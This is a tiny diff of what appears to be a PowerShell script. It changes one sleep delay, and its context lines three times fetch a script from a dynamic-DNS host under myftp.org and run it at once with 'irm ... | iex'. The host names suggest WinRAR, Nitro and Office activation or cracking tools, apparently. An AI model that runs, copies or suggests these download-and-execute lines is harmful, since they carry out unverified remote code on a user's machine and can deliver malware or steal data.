@@ -1,5 +1,5 @@
 irm jdcs-winrar.myftp.org | iex
-sleep 5
+sleep 10
 irm jdcs-nitro.myftp.org | iex
 sleep 5
 irm jdcs-office.myftp.org | iex
